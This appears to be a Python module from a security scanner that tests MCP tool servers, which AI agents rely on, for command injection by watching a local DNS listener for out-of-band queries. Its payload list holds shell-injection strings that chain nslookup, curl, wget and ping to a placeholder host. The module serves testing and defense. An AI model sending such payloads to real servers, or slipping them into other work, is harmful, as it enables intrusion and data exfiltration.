"""Out-of-band detection via DNS exfiltration.

The listener binds loopback port 53 by default because the payloads ask the
local resolver to query it.  A bind failure skips the suite instead of aborting
the scan.  A captured query for a unique token is strong evidence.
"""
from __future__ import annotations

import logging
import threading
import time
import uuid
from socketserver import DatagramRequestHandler, ThreadingUDPServer

from core.evidence import make_finding
from core.protocol import (
    ProtocolError,
    RequestTimeout,
    SafetyLimitExceeded,
    TransportError,
)

logger = logging.getLogger("mcpwn.oob")


class OOBTest:
    """Detect OOB data exfiltration via DNS queries."""

    DEFAULT_DNS_PORT = 53

    def __init__(self, pentester):
        self.pentester = pentester
        self.dns_server = None
        self.dns_port = (pentester.config.get("oob_dns_port")
                         or self.DEFAULT_DNS_PORT)
        self._listener_failed = False
        self.captured_queries = {}

    DNS_PAYLOADS = [
        "; nslookup {token}.oob.local 127.0.0.1",
        "| nslookup {token}.oob.local 127.0.0.1",
        "$(nslookup {token}.oob.local 127.0.0.1)",
        "`nslookup {token}.oob.local 127.0.0.1`",
        "; curl http://{token}.oob.local",
        "| curl http://{token}.oob.local",
        "; wget http://{token}.oob.local",
        "| wget http://{token}.oob.local",
        "; ping -c 1 {token}.oob.local",
        "& ping -n 1 {token}.oob.local",
    ]

    def _start_dns_listener(self) -> bool:
        parent = self

        class DNSHandler(DatagramRequestHandler):
            def handle(self):
                data = self.request[0]
                if len(data) <= 12:
                    return
                query = self._parse_dns_query(data)
                if not query:
                    return
                with threading.Lock():
                    for token in list(parent.captured_queries):
                        if token in query and parent.captured_queries[token] \
                                is None:
                            parent.captured_queries[token] = {
                                "query": query,
                                "source": self.client_address,
                                "time": time.time(),
                            }

            @staticmethod
            def _parse_dns_query(data):
                try:
                    labels = []
                    index = 12
                    while index < len(data) and data[index] != 0:
                        length = data[index]
                        if length == 0 or index + length >= len(data):
                            break
                        labels.append(data[index + 1:index + 1 + length].decode(
                            "ascii", errors="ignore"))
                        index += length + 1
                    return ".".join(labels) if labels else None
                except (IndexError, UnicodeDecodeError):
                    return None

        try:
            self.dns_server = ThreadingUDPServer(
                ("127.0.0.1", self.dns_port), DNSHandler)
        except OSError as exc:
            self._listener_failed = True
            logger.warning(
                "OOB DNS listener unavailable on 127.0.0.1:%s (%s); "
                "skipping OOB exfiltration tests", self.dns_port, exc)
            return False
        thread = threading.Thread(
            target=self.dns_server.serve_forever, name="mcpwn-oob-dns",
            daemon=True)
        thread.start()
        return True

    def run(self, tool):
        findings = []
        if not self.dns_server:
            if self._listener_failed or not self._start_dns_listener():
                return findings
        schema = tool.get("inputSchema", {}) or {}
        properties = schema.get("properties", {}) or {}
        test_args = [name for name, spec in properties.items()
                     if not isinstance(spec, dict) or spec.get("type") in
                     (None, "string")]
        for arg in test_args[:3]:
            for template in self.DNS_PAYLOADS:
                token = uuid.uuid4().hex[:10]
                self.captured_queries[token] = None
                payload = template.format(token=token)
                try:
                    self.pentester.send(
                        "tools/call",
                        {"name": tool.get("name"),
                         "arguments": {arg: payload}},
                        skip_analysis=True,
                    )
                except (TransportError, ProtocolError, RequestTimeout,
                        SafetyLimitExceeded) as exc:
                    logger.debug("OOB probe failed: %s", exc)
                    continue
                captured = None
                for _ in range(5):
                    captured = self.captured_queries.get(token)
                    if captured:
                        break
                    time.sleep(0.2)
                if captured:
                    findings.append(make_finding(
                        "OOB_DNS",
                        tool=tool.get("name"),
                        arg=arg,
                        payload=payload,
                        severity="CRITICAL",
                        confidence=92,
                        verified=True,
                        evidence=[
                            "DNS query: {}".format(captured.get("query")),
                            "source: {}".format(captured.get("source")),
                        ],
                        note="out-of-band DNS interaction captured",
                    ))
                    break
        return findings

    def cleanup(self):
        if self.dns_server is not None:
            try:
                self.dns_server.shutdown()
                self.dns_server.server_close()
            except OSError as exc:
                logger.debug("DNS listener cleanup error: %s", exc)
            finally:
                self.dns_server = None
